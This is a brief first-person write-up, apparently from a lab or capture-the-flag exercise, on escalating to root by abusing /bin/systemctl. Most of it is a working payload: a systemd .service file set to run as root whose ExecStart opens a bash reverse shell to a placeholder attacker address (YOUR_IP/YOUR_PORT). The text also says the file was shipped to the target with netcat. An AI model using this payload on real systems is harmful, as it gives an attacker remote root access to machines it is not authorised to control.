I ran into some issues trying to exploit /bin/systemctl.
Finally figured I could create a malicious .service file on my attackbox and ship it to the remote machine.

Payload:
	[Unit]
	Description=roooooooooot
	
	[Service]
	Type=simple
	User=root
	ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'
	
	[Install]
	WantedBy=multi-user.target

I created mal.service with that payload and used netcat to transfer the payload to the target system.
